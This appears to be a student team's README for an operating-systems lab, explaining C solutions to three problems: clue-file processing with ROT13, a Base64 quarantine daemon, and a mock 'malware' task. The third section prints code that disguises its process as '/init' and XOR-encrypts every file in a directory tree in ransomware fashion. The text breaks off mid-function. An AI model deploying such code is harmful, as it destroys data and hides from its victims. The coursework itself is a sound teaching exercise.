# Sisop-2-2025-IT30
### by IT30


### Anggota Kelompok

| No | Nama                              | NRP         |
|----|-----------------------------------|------------|
| 1  | Adiwidya Budi Pratama            | 5027241012 |
| 2  | Ahmad Rafi Fadhillah Dwiputra     | 5027241068 |
| 3  | Dimas Satya Andhika              | 5027241032 |

---

## Soal_1

__ACTION, DRAGON CYRUS 🐉__ 
=

```c
#define BIG_PATH (PATH_MAX * 2)
```
Konstanta yang didefinisikan untuk menyimpan path file atau folder dengan ukuran lebih besar dari standar.

---
**is_regular_file**
```c
int is_regular_file(const char *path) {
    struct stat path_stat;
    return stat(path, &path_stat) == 0 && S_ISREG(path_stat.st_mode);
}
```
- Menggunakan stat() untuk mendapatkan informasi file (struct stat).
- Fungsi akan mengembalikan 1 (true) jika file adalah regular file (bukan folder, symlink, dsb), yaitu jika S_ISREG(path_stat.st_mode) benar.
- Jika gagal memanggil stat, atau file bukan regular file → return 0.
----

**is_valid_clue_file**
```c
int is_valid_clue_file(const char *name) {
return strlen(name) == 5 &&
    name[1] == '.' && name[2] == 't' && name[3] == 'x' && name[4] == 't' &&
    (isdigit(name[0]) || isalpha(name[0]));
}
```
- Mengecek apakah nama file:

    - Berjumlah tepat 5 karakter.

    - Formatnya [karakter].txt.

    - Awal namanya adalah huruf atau angka.

- Contoh valid: A.txt, 3.txt

---
**download_file**
```c
void download_file(const char *url, const char *output) {
    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {"wget", "-q", (char *)url, "-O", (char *)output, NULL};
        execvp("wget", argv);
        perror("execvp wget");
        exit(1);
    } else {
        wait(NULL);
    }
}
```
- Membuat child process dengan fork().
- Child process mengeksekusi command wget -q <url> -O <output>:
    - -q: quiet mode (tanpa output)
    - -O: simpan hasil download ke nama file tertentu
- Parent process menunggu dengan wait(NULL) sampai download selesai.
- Jika execvp gagal, perror mencetak error.

---
**unzip_file**
```c
void unzip_file(const char *file) {
    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {"unzip", "-o", (char *)file, NULL};
        execvp("unzip", argv);
        perror("execvp unzip");
        exit(1);
    } else {
        wait(NULL);
    }
}
```
- Seperti download_file, fungsi ini menjalankan perintah:
    - unzip -o <file> di child process
    - -o: overwrite file jika sudah ada
- Proses utama menunggu sampai unzip selesai.

---
**move_and_clean**
```c
void move_and_clean(const char *basepath) {
    char *clue_folders[] = {"ClueA", "ClueB", "ClueC", "ClueD"};
    char target_dir[] = "Filtered";
    mkdir(target_dir, 0755);

    for (int i = 0; i < 4; i++) {
        char path[BIG_PATH];
        snprintf(path, sizeof(path), "%s/%s", basepath, clue_folders[i]);

        DIR *dir = opendir(path);
        if (!dir) continue;

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;

            // Hitung panjang filepath lebih awal
            size_t len_path = strlen(path);
            size_t len_name = strlen(entry->d_name);
            size_t total_len = len_path + 1 + len_name + 1;

            if (total_len > BIG_PATH) {
                fprintf(stderr, "Filepath too long: %s/%s\n", path, entry->d_name);
                continue;
            }

            char filepath[BIG_PATH];
            if (strlen(path) + 1 + strlen(entry->d_name) + 1 > sizeof(filepath)) {
                fprintf(stderr, "Filepath too long: %s/%s\n", path, entry->d_name);
                continue;
            }
            
            strcpy(filepath, path);
            strcat(filepath, "/");
            strcat(filepath, entry->d_name);

            if (!is_regular_file(filepath)) continue;

            if (is_valid_clue_file(entry->d_name)) {
                size_t len_dest = strlen(target_dir) + 1 + len_name + 1;
                if (len_dest > BIG_PATH) {
                    fprintf(stderr, "Dest path too long: %s/%s\n", target_dir, entry->d_name);
                    continue;
                }

                char dest[BIG_PATH];
                if (strlen(target_dir) + 1 + strlen(entry->d_name) + 1 > sizeof(dest)) {
                    fprintf(stderr, "Dest path too long: %s/%s\n", target_dir, entry->d_name);
                    continue;
                }
                
                strcpy(dest, target_dir);
                strcat(dest, "/");
                strcat(dest, entry->d_name);

                if (rename(filepath, dest) != 0)
                    perror("rename");
            } else {
                remove(filepath);
            }
        }

        closedir(dir);
    }
}
```
- Memuat folder Filtered jika belum ada.
- Masuk ke masing-masing folder ClueA–ClueD.
- Setiap file diperiksa:
    - Jika valid (format clue), dipindahkan ke         Filtered/. → pakai rename(src, dest)
    - Jika tidak valid, dihapus. → pakai remove(path)

---
**compare**
```c
int compare(const void *a, const void *b) {
    const char *fa = *(const char **)a;
    const char *fb = *(const char **)b;
    return strcmp(fa, fb);
}
```
- Fungsi pembanding ini digunakan oleh qsort() untuk mengurutkan array string.
- void *a dan void *b adalah pointer ke elemen array char*, jadi:
    - *(const char **)a → ambil string fa
    - *(const char **)b → ambil string fb
- Kemudian, strcmp(fa, fb) membandingkan dua string secara alfabetis.

---
```c
**is_digit_file**
bool is_digit_file(const char *name) {
    return isdigit(name[0]);
}
```
- Mengecek apakah karakter pertama nama file adalah angka (0–9).
- isdigit() adalah fungsi dari <ctype.h>, hasilkan true jika input adalah digit.

---
**is_alpha_file**
```c
bool is_alpha_file(const char *name) {
    return isalpha(name[0]);
}
```
- Mengecek apakah karakter pertama nama file adalah huruf alfabet (a–z, A–Z).
- isalpha() juga dari <ctype.h>, hasilkan true jika huruf.

---
**combine_files**
```c
void combine_files() {
    DIR *dir = opendir("Filtered");
    if (!dir) {
        perror("opendir Filtered");
        return;
    }

    struct dirent *entry;
    char *digits[512], *alphas[512];
    int dcount = 0, acount = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_REG || !is_valid_clue_file(entry->d_name)) continue;

        if (is_digit_file(entry->d_name))
            digits[dcount++] = strdup(entry->d_name);
        else if (is_alpha_file(entry->d_name))
            alphas[acount++] = strdup(entry->d_name);
    }
    closedir(dir);

    qsort(digits, dcount, sizeof(char *), compare);
    qsort(alphas, acount, sizeof(char *), compare);

    FILE *out = fopen("Combined.txt", "w");
    if (!out) {
        perror("fopen Combined.txt");
        return;
    }

    int i = 0, j = 0;
    bool pick_digit = true;

    while (i < dcount || j < acount) {
        const char *fname = NULL;
        if (pick_digit && i < dcount) {
            fname = digits[i++];
        } else if (!pick_digit && j < acount) {
            fname = alphas[j++];
        }
        pick_digit = !pick_digit;

        if (fname) {
            char fullpath[BIG_PATH];
            snprintf(fullpath, sizeof(fullpath), "Filtered/%s", fname);

            FILE *in = fopen(fullpath, "r");
            if (in) {
                int c;
                while ((c = fgetc(in)) != EOF) {
                    fputc(c, out);
                }
                fclose(in);
                remove(fullpath);
            } else {
                perror("fopen input file");
            }
        }
    }

    fclose(out);

    for (int k = 0; k < dcount; k++) free(digits[k]);
    for (int k = 0; k < acount; k++) free(alphas[k]);
}
```
- Buka folder Filtered/.
- Pisahkan file yang diawali angka dan huruf ke array berbeda.
- Urutkan keduanya.
- Gabungkan konten file ke Combined.txt dengan urutan selang-seling:
    - digit → alpha → digit → alpha, dst.
- File yang sudah dibaca langsung dihapus.

---
**rot13_char**
```c
char rot13_char(char c) {
    if ('a' <= c && c <= 'z') return ((c - 'a' + 13) % 26) + 'a';
    if ('A' <= c && c <= 'Z') return ((c - 'A' + 13) % 26) + 'A';
    return c;
}
```
- ungsi ROT13: menggeser huruf alfabet sebanyak 13.
- Non-alfabet tidak berubah.

---
**decode_file***
```c
void decode_file() {
    FILE *in = fopen("Combined.txt", "r");
    if (!in) {
        perror("fopen Combined.txt");
        return;
    }

    FILE *out = fopen("Decoded.txt", "w");
    if (!out) {
        perror("fopen Decoded.txt");
        fclose(in);
        return;
    }

    int c;
    while ((c = fgetc(in)) != EOF) {
        fputc(rot13_char(c), out);
    }

    fclose(in);
    fclose(out);
}
```
- Buka Combined.txt, baca tiap karakter.
- Enkripsi balik menggunakan ROT13 → tulis ke Decoded.txt.

---
**validate_password**
```c
void validate_password() {
    FILE *fp = fopen("Decoded.txt", "r");
    if (!fp) {
        perror("fopen Decoded.txt");
        return;
    }

    char password[256];
    if (fgets(password, sizeof(password), fp) == NULL) {
        fprintf(stderr, "Decoded.txt is empty or invalid\n");
        fclose(fp);
        return;
    }
    size_t len = strlen(password);
    if (len > 0 && password[len - 1] == '\n') password[len - 1] = '\0';

    fclose(fp);

    const char *correct = "BewareOfAmpy";
    if (strcmp(password, correct) == 0) {
        printf("YEAYYY password benar. Pintu terbuka!\n");
    } else {
        printf("Password salah. Naga Cyrus membakar mu dengan api neraka\n");
    }
}
```
- Ambil baris pertama dari Decoded.txt.
- Bandingkan password dengan string "BewareOfAmpy".
- Output pesan sesuai hasil validasi.

---
**main**
```c
int main(int argc, char *argv[]) {
    if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) {
            move_and_clean("Clues");
            return 0;
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
            return 0;
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
            return 0;
        } else if (strcmp(argv[2], "Validate") == 0) {
            validate_password();
            return 0;
        }
    } else if (argc == 1) {
        struct stat st;
        if (stat("Clues", &st) == 0 && S_ISDIR(st.st_mode)) {
            printf("Folder clue sudah ada\n");
            return 0;
        }

        const char *url = "https://drive.usercontent.google.com/u/0/uc?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download";
        const char *zipname = "Clues.zip";

        download_file(url, zipname);
        unzip_file(zipname);
        remove(zipname);

        return 0;
    }

    fprintf(stderr, "Usage:\n");
    fprintf(stderr, "  ./action               # Download and unzip if not exists\n");
    fprintf(stderr, "  ./action -m Filter     # Filter valid clue files\n");
    fprintf(stderr, "  ./action -m Combine    # Combine filtered files\n");
    fprintf(stderr, "  ./action -m Decode     # Decode Combined.txt using ROT13\n");
    fprintf(stderr, "  ./action -m Validate   # Check if password is correct\n");
    return 1;
}
```
```c
if (argc == 3 && strcmp(argv[1], "-m") == 0) {
```
mengecek argumen yang diberikan

```c
if (strcmp(argv[2], "Filter") == 0) {
            move_and_clean("Clues");
            return 0;
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
            return 0;
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
            return 0;
        } else if (strcmp(argv[2], "Validate") == 0) {
            validate_password();
            return 0;
        }
```
memilih mode yang dijalankan

```c
} else if (argc == 1) {
```
Jika tidak ada argumen, program akan memulai proses inisialisasi.

```c
if (stat("Clues", &st) == 0 && S_ISDIR(st.st_mode)) {
    printf("Folder clue sudah ada\n");
```
jika folder Clues sudah ada, hentikan proses (tidak perlu download ulang).

```c
Copy code
const char *url = "...";
const char *zipname = "Clues.zip";
download_file(url, zipname);
unzip_file(zipname);
remove(zipname);
```
mengunduh Clues.zip, mengekstrak isinya, lalu menghapus file ZIP-nya.

```c
fprintf(stderr, "Usage:\n");
```
menampilkanp panduan jika argumen tidak valid

---

## soal_2

### Yoisaki Kanade's (🎼🎶✍✨) Decryption Program.
---
### Problem:
  
> **[...] . Namun sialnya, komputer Kanade terkena sebuah virus yang tidak diketahui. Setelah dianalisis oleh Kanade sendiri, ternyata virus ini bukanlah sebuah trojan, ransomware, maupun tipe virus berbahaya lainnya, melainkan hanya sebuah malware biasa yang hanya bisa membuat sebuah perangkat menjadi lebih lambat dari biasanya.**
- **Mendownload dan unzip *.zip* yang berisi file (yang termasuk virus) ke dalam dir. *~/starter_kit* melalui [link](https://drive.google.com/file/d/1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS/view) berikut, lalu mengahapus *.zip* setelah unzip secara otomatis.**
- **Program *--decrypt* yang akan men*decrypt* nama dari file dengan dasar algo Base64 dalam suatu direktori baru *~/quarantine* dengan basis daemon.**
- **Fitur memindahankan file dengan *--quarantine* (memindahkan file *~/starter_kit* >  *~/quarantine*) dan *--return* (mengembalikan file *~/quarantine* > *~/starter_kit*).**
- **Menghapus seluruh file dalam dir. *~/quarantine* dengan *--eradicate*.**
- **Mematikan program *--decrypt* berdasarkan PID *process*-nya secara aman dengan *---shutdown*.**
- **Error-Handling dalam mencegah penggunaan *usage* program yang salah.**
- **Pencatatan *log* seluruh aktivitas program dalam suatu file *activity.log* berdasarkan format yang telah ditentukan. (dalam shift soal)**

### **Structure:**

    soal_2
	    ├── activity.log
	    ├── quarantine
	    ├── starter_kit
	    │ └── <file hasil unzip>
	    ├── starterkit
	    └── starterkit.c

---
### Code's Key Components

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <dirent.h>
    #include <sys/stat.h>
    #include <sys/types.h>
    #include <time.h>
    #include <signal.h>
    #include <sys/wait.h>
    
    #define STARTER_KIT_ZIP "starter_kit.zip"
    #define STARTER_KIT_DIR "starter_kit"
    #define QUARANTINE_DIR "quarantine"
    #define LOG_FILE "activity.log"
    #define PID_FILE "/tmp/starterkit_decrypt.pid"
    #define DOWNLOAD_URL "https://drive.google.com/..."

Digunakanan dalam meng*import* seluruh library yang digunakan dalam kode:
-   I/O (`stdio.h`),  Manajemen memori (`stdlib.h`), dan Manipulasi string (`string.h`)
    
-   Operasi sistem seperti fork, wait, mkdir, file handling (`unistd.h`, `sys/stat.h`, `dirent.h`, dll)

Serta mendefinisikan nama file dan directory yang akan digunakan dalam proses kode.

    int stop_daemon = 0;
    
    void handle_sigterm(int sig) {
        stop_daemon = 1;
    }
Akan berfungsi sebagai variabel dalam handling signal SIGTERM untuk menghentikan daemon *--decrypt* dalam looping decryption dan programnya itu sendiri.

#### Pencatatan *activity log* dalam penggunaan program

    void write_log_action(const char *action, const char *detail) {
        FILE *log = fopen(LOG_FILE, "a");
        if (!log) return;
    
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        char timestamp[32];
        strftime(timestamp, sizeof(timestamp), "%d-%m-%Y][%H:%M:%S", tm_info);
    
        if (detail)
            fprintf(log, "[%s] - %s - %s\n", timestamp, detail, action);
        else
            fprintf(log, "[%s] - %s\n", timestamp, action);
    
        fclose(log);
    }
Akan berfungsi sebagai *function* dalam mencatat *log* seluruh aktivitas penggunaan program dengan disertai pencatatan waktu penggunaannya ke dalam file "activity.log".

#### Download dan unzip ".zip" pada program

    void download_and_extract() {
        struct stat st;
        if (stat(STARTER_KIT_DIR, &st) == 0) return;
    
        printf("⏬ Download dan mengekstrak starter kit, tunggu kejap...\n");
    
        pid_t pid = fork();
        if (pid == 0) {
            char *args[] = {"sh", "-c", "wget -q --show-progress -O starter_kit.zip 'https://drive.google.com/uc?export=download&id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS'", NULL};
            execv("/bin/sh", args);
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            wait(NULL);
        }
    
        mkdir(STARTER_KIT_DIR, 0755);
    
        pid = fork();
        if (pid == 0) {
            char *args[] = {"sh", "-c", "unzip -q starter_kit.zip -d starter_kit", NULL};
            execv("/bin/sh", args);
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            wait(NULL);
        }
    
        remove(STARTER_KIT_ZIP);
        printf("✅ Starter kit berhasil terdownload dan diekstrak di starter_kit.\n");
    }
Fungsi ini digunakan dalam mengunduh dan meng-unzip ".zip" ke dalam dir. *~/starter_kit* serta menghapus ".zip" secara otomatis.

**Cara kerja *function* secara berkala:**
1. Program akan mengecek jika dir. *~/starter_kit* sudah ada atau belum.
2. Jika dir. *~/starter_kit* tidak ada, kode akan secara otomatis membuat `fork` , mendownload file ".zip" dengan `wget` ke dalam file bernama "starter_kit.zip" dan membuat dir. *~/starter_kit*.
3. Dalam *unzipping*, *function* akan membuat `fork` untuk mengekstrak ke dalam dir. *~/starter_kit*.
4. Menghapus "starter_kit.zip" dan memberi keterangan bahwa *function* telah berhasil dijalankan.

#### Base64 algo decode

    char *base64_decode(const char *input) {
		static char output[256];
		memset(output, 0, sizeof(output));
		
        const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        int val = 0, valb = -8;
        size_t len = 0;
 
        for (const char *p = input; *p && *p != '='; p++) {
            const char *pos = strchr(base64_table, *p);
            if (!pos) return NULL;
            val = (val << 6) + (pos - base64_table);
            valb += 6;
            if (valb >= 0) {
                output[len++] = (char)((val >> valb) & 0xFF);
                valb -= 8;
                if (len >= sizeof(output) - 1) break;
            }
        }
        output[len] = '\0';
		if (len < 1) return NULL;

		for (size_t i = 0; i < len; i++) {
		    if (output[i] == '\n' || output[i] == '\r') {
		        output[i] = '\0';
		        break;
		    }
		}

	    return output;
    }
Berfungsi sebagai algo decode dalam decryption yang didasarkan pada format Base64.
Algo ini berfungsi dengan mengambil input string nama file dalam format Base64 secara *looping*, lalu mengubahnya ke bentuk aslinya dengan memecah bit-bitnya dan mengembalikan outputnya setelah diproses oleh daemon *--decrypt*.

#### Proses *decryption daemon* dengan PID

    void decrypt_process() {
        FILE *pidfile = fopen(PID_FILE, "w");
        if (pidfile) {
            fprintf(pidfile, "%d", getpid());
            fclose(pidfile);
        } else {
            return;
        }
    
        char message[128];
        snprintf(message, sizeof(message), "Successfully started decryption process with PID %d.", getpid());
        write_log_action(message, NULL);
        printf("🔓 Proses decryption dimulai : (PID %d). Segala activity akan tercatat dalam '%s'.\n", getpid(), LOG_FILE);
    
        while (!stop_daemon) {
            DIR *dir = opendir(QUARANTINE_DIR);
            if (!dir) {
                sleep(10);
                continue;
            }
    
            struct dirent *entry;
            while ((entry = readdir(dir))) {
                if (entry->d_type == DT_REG) {
                    char clean_name[256];
                    strncpy(clean_name, entry->d_name, sizeof(clean_name));
                    clean_name[sizeof(clean_name)-1] = '\0';
                    char *newline = strchr(clean_name, '\n');
                    if (newline) *newline = '\0';
                    if (clean_name[0] == '\'' && clean_name[strlen(clean_name)-1] == '\'') {
                        memmove(clean_name, clean_name+1, strlen(clean_name));
                        clean_name[strlen(clean_name)-2] = '\0';
                    }
    
                    char *decoded = base64_decode(clean_name);
                    if (decoded && strlen(decoded) > 0 && strcmp(clean_name, decoded) != 0) {
                        char oldpath[512], newpath[512];
                        snprintf(oldpath, sizeof(oldpath), "%s/%s", QUARANTINE_DIR, entry->d_name);
                        snprintf(newpath, sizeof(newpath), "%s/%s", QUARANTINE_DIR, decoded);
                        rename(oldpath, newpath);
                    }
                }
            }
            closedir(dir);
            sleep(10);
        }
    }
Berfungsi dalam menjalankan daemon process untuk *--decrypt* secara *looping* pada dir. *~/quarantine*.

**Cara kerja *function* secara berkala:**
1.   Program menyimpan PID daemon di file `/tmp/starterkit_decrypt.pid`.
    
2.   Menuliskan log bahwa proses dekripsi telah dimulai.
    
3.   Masuk ke dalam loop selama `stop_daemon == 0`.
    
4.   Setiap 10 detik:
		- Membuka folder `quarantine`,
		- Mengecek file satu per satu,
		- Jika nama file terenkripsi dalam Base64, algo akan mengdecode nama file dan rename ke nama dari hasil decode.
            
5.   Program berhenti hanya jika menerima sinyal `SIGTERM`, yang akan mengubah nilai `stop_daemon` menjadi `1`.

#### Memindahkan seluruh file dari suatu direktori

    void move_files(const char *src, const char *dst, const char *label) {
        DIR *dir = opendir(src);
        if (!dir) return;
    
        int found = 0;
        struct dirent *entry;
        while ((entry = readdir(dir))) {
            if (entry->d_type == DT_REG) {
                found = 1;
                char oldpath[512], newpath[512];
                snprintf(oldpath, sizeof(oldpath), "%s/%s", src, entry->d_name);
                snprintf(newpath, sizeof(newpath), "%s/%s", dst, entry->d_name);
    
                struct stat st;
                if (stat(newpath, &st) == 0) continue;
    
                rename(oldpath, newpath);
    
                if (strcmp(label, "quarantine") == 0) {
                    write_log_action("Successfully moved to quarantine directory.", entry->d_name);
                } else {
                    write_log_action("Successfully returned to starter kit directory.", entry->d_name);
                }
            }
        }
        if (!found) {
            printf("⚠️ Tidak ada file dalam %s untuk dipindah\n", src);
        } else {
            if (strcmp(label, "quarantine") == 0) {
                printf("📁 Seluruh file berhasil dipindahkan ke quarantine.\n");
            } else {
                printf("📂 Seluruh file berhasil dikembalikan ke starter kit.\n");
            }
        }
        closedir(dir);
    }
Berfungsi dalam memindahkan keseluruhan file yang ada pada suatu direktori ke dir. lainnya dengan path.
Secara sederhana, kode pemindahan file akan berjalan dengan alur:
-   Program membuka direktori sumber (`starter_kit` atau `quarantine`).
    
-   Program membaca semua file dalam folder sumber.
    
-   Untuk setiap file reguler:
    
    -   Menyusun path asal dan tujuan,
        
    -   Mengecek apakah file pada dir. tujuan sudah ada,
        
    -   Jika belum ada, file dipindah (`rename()`) yang juga berfungsi sebagai `move`,
        
    -   Menulis log untuk file yang dipindahkan.
        
-   Menampilkan informasi ke user apakah file berhasil dipindahkan atau tidak.
    
-   Menutup folder setelah selesai.

#### Menghapus seluruh file dari direktori *~/quarantine*

    void eradicate_files() {
        DIR *dir = opendir(QUARANTINE_DIR);
        if (!dir) {
            printf("⚠️ Tidak ada quarantine folder.\n");
            return;
        }
    
        int found = 0;
        struct dirent *entry;
        while ((entry = readdir(dir))) {
            if (entry->d_type == DT_REG) {
                found = 1;
                char path[512];
                snprintf(path, sizeof(path), "%s/%s", QUARANTINE_DIR, entry->d_name);
                remove(path);
                write_log_action("Successfully deleted.", entry->d_name);
            }
        }
        if (!found) {
            printf("⚠️ Files dalam quarantine tidak ditemukan untuk eradicate.\n");
        } else {
            printf("🗑️ Semua file telah dihapus dalam quarantine.\n");
        }
        closedir(dir);
    }
Berfungsi dalam menghapus seluruh file yang ada dalam direktori *~/quarantine*.
Secara sederhana, kode penghapusan selurh file akan berjalan dengan alur:
-   Program mencoba membuka folder `quarantine`, jika folder tidak ditemukan, tampilkan peringatan dan keluar.
-   Jika tidak ada file yang ditemukan didalam dir. *~/quarantine*, tampilkan pesan bahwa dir. kosong.
    
-   Jika berhasil:
    
    -   Program mengecek seluruh entri file:
        
        -   Susun path lengkap file,
            
        -   Hapus file tersebut dari sistem,
            
        -   Catat log bahwa file berhasil dihapus.
            
-   Setelah proses penghapusan file, tampilkan pesan bahwa proses eradikasi berhasil.
        
-   Tutup folder.

#### Mematikan/menghentikan daemon process *--decrypt*

    void shutdown_daemon() {
        FILE *pidfile = fopen(PID_FILE, "r");
        if (!pidfile) {
            printf("❌ Error: Tidak ada proses decrypt yang running.\n");
            return;
        }
        int pid;
        if (fscanf(pidfile, "%d", &pid) != 1) {
            printf("❌ Error: Gagal untuk membaca PID file.\n");
            fclose(pidfile);
            return;
        }
        fclose(pidfile);
        kill(pid, SIGTERM);
        remove(PID_FILE);
    
        char message[128];
        snprintf(message, sizeof(message), "Successfully shut off decryption process with PID %d.", pid);
        write_log_action(message, NULL);
        printf("🔒 Proses decrytion telah berhasil dimatikan.\n");
    }

Berfungsi dalam menghentikan/mematikan proses daemon *--decrypt* yang berjalan di backgrond berdasarkan PID-nya.

**Cara kerja *function* secara berkala:**
1. Program mencoba membuka file `/tmp/starterkit_decrypt.pid`.
*! : `/tmp/starterkit_decrypt.pid` adalah file yang berisi PID daemon process *--decrypt* di `/tmp/`
    
2. Jika file tidak ditemukan → tampilkan error dan keluar.
    
3. Jika file ditemukan:
    
    -   Baca PID dari file dengan `fscanf()`,
        
    -   Kirim sinyal `SIGTERM` ke proses daemon dengan PID tersebut yang akan memberikan sinyal kepada handler `SIGTERM` dan mengubah `stop_daemon = 1`.
        
    -   Hapus file PID,
        
4. Tulis log bahwa proses daemon dimatikan dan tampilkan pesan sukses *--shutdown* ke user.

#### Code Main Function

    int main(int argc, char *argv[]) {
        signal(SIGTERM, handle_sigterm);
        mkdir(QUARANTINE_DIR, 0755);
        download_and_extract();
    
        if (argc < 2) {
            printf("📌 Usage: ./starterkit [--decrypt | --quarantine | --return | --eradicate | --shutdown]\n");
            return 1;
        }
    
        printf("📝 Seluruh activity akan disimpan dalam '%s'.\n", LOG_FILE);
    
        if (strcmp(argv[1], "--decrypt") == 0) {
            FILE *pidfile = fopen(PID_FILE, "r");
            if (pidfile) {
                fclose(pidfile);
                printf("⚠️ Proses decryption telah berjalan.\n");
                return 1;
            }
            pid_t pid = fork();
            if (pid < 0) {
                perror("fork");
                return 1;
            }
            if (pid > 0) {
                return 0;
            }
            setsid();
            umask(0);
            decrypt_process();
    
        } else if (strcmp(argv[1], "--quarantine") == 0) {
            move_files(STARTER_KIT_DIR, QUARANTINE_DIR, "quarantine");
    
        } else if (strcmp(argv[1], "--return") == 0) {
            move_files(QUARANTINE_DIR, STARTER_KIT_DIR, "return");
    
        } else if (strcmp(argv[1], "--eradicate") == 0) {
            eradicate_files();
    
        } else if (strcmp(argv[1], "--shutdown") == 0) {
            shutdown_daemon();
    
        } else {
            printf("❌ Error: Command '%s' tidak dikenali. Gunakan command usage yang ada.\n", argv[1]);
            printf("📌 Usage: ./starterkit [--decrypt | --quarantine | --return | --eradicate | --shutdown]\n");
            return 1;
        }
    
        return 0;
    }
Pada *function* ini, seluruh penggunaan dan inisialisasi pada program/fungsi-fungsi yang ada dalam kode sebagai *flag* eksekusi dan lainnya.

-   Program meng-setup sinyal `SIGTERM` dan buat folder `quarantine`.
    
-   Cek apakah `starter_kit` sudah ada, jika tidak → *function download dan ekstrak* dijalankan.
    
-   Validasi apakah pengguna memberikan argumen dengan `argv[1]`.
    
-   Jalankan perintah sesuai flag:
    
    -   `--decrypt` akan mengecek ada/tidaknya file PID, jika ada akan memberikan warning, jika belum maka *function --decrypt* akan dijalankan. 
    - `--quarantine` menjalankan dan set path untuk memindahkan file dari *~/starter_kit* ke *~/quarantine*,  begitupun sebaliknya untuk `--return`.
    - `--eradicate` akan menjalankan sesuai *function*-nya.
    - `--shutdown` akan menghentikan daemon process dari PID-nya sesuai *function*-nya dengan sinyal `SIGTERM`.
        
-   Jika tidak valid, tampilkan error dan usage sebagai *error-handling* pada penggunaan usage kode.
    
-   Memberi keterangan bahwa semua log aktivitas disimpan di `activity.log`.
- `return 0;`

---

## Soal_3

[Author: Afnaan / honque]

> Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee. Share ke teman teman kalian yang tidak mengerjakan soal ini

![image](https://github.com/user-attachments/assets/a5aa5a54-1cca-42a2-930a-9e7cc9966b19)


a. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.
```bash
if (argc > 0 && strcmp(argv[0], "init") == 0) {
        daemonize();
        chdir(cwd);
        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
```
- `if (argc > 0 && strcmp(argv[0], "init") == 0)`: Mengecek apakah argumen pertama adalah "init".
- `daemonize();`: Mengubah proses menjadi daemon (background process).
- `chdir(cwd);`: Berpindah ke working directory awal
- `prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);`: Menyamarkan nama proses di sistem menjadi "/init".

b. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor bekerja dengan mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program.

```sh
void encrypt_all_files(const char *dirpath, const char *self_exe) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt_all_files(fullpath, self_exe);
        } else if (S_ISREG(st.st_mode)) {
            if (strcmp(fullpath, self_exe) != 0) {
                printf("Enkripsi: %s\n", fullpath);
                simple_xor_encrypt(fullpath);
            }
        }
    }

    closedir(dir);
}
```
- Melakukan rekursi ke semua file dalam folder dirpath
- Mengenkripsi semua file reguler selain dirinya sendiri (self_exe)
- `if (S_ISDIR(st.st_mode)) {
        encrypt_all_files(fullpath, self_exe);
    } `Jika item adalah direktori, lakukan rekursi ke dalamnya.
- `else if (S_ISREG(st.st_mode)) {
        if (strcmp(fullpath, self_exe) != 0) {
            printf("Enkripsi: %s\n", fullpath);
            simple_xor_encrypt(fullpath);
        }
    }` Jika file biasa, dan bukan executable malware itu sendiri, tampilkan log dan enkripsi file.
```sh
void simple_xor_encrypt(const char *filename) {
    FILE *f = fopen(filename, "rb+");
    if (!f) {
        perror("Gagal membuka file untuk enkripsi");
        return;
    }

    time_t timestamp = time(NULL);
    unsigned char key[8];
    for (int i = 0; i < 8; i++) {
        key[i] = (timestamp >> (i * 8)) & 0xFF;
    }

    int c;
    size_t i = 0;
    while ((c = fgetc(f)) != EOF) {
        fseek(f, -1, SEEK_CUR);
        fputc(c ^ key[i % 8], f);
        i++;
    }

    fclose(f);
}
```
- `FILE *f = fopen(filename, "rb+");
if (!f) {
    perror("Gagal membuka file untuk enkripsi");
    return;
}` Buka file untuk dibaca dan ditulis. Jika gagal, tampilkan error dan keluar.
- `time_t timestamp = time(NULL);
unsigned char key[8];
for (int i = 0; i < 8; i++) {
    key[i] = (timestamp >> (i * 8)) & 0xFF;
} `Bangkitkan key 8-byte dari UNIX timestamp. XOR key ini akan digunakan untuk enkripsi.
- `int c;
size_t i = 0;
while ((c = fgetc(f)) != EOF) {
    fseek(f, -1, SEEK_CUR);
    fputc(c ^ key[i % 8], f);
    i++;
} ` Baca byte demi byte, lalu XOR dengan key, lalu tulis kembali ke tempat semula (fseek menggeser pointer kembali satu byte).
```sh
void delete_directory(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
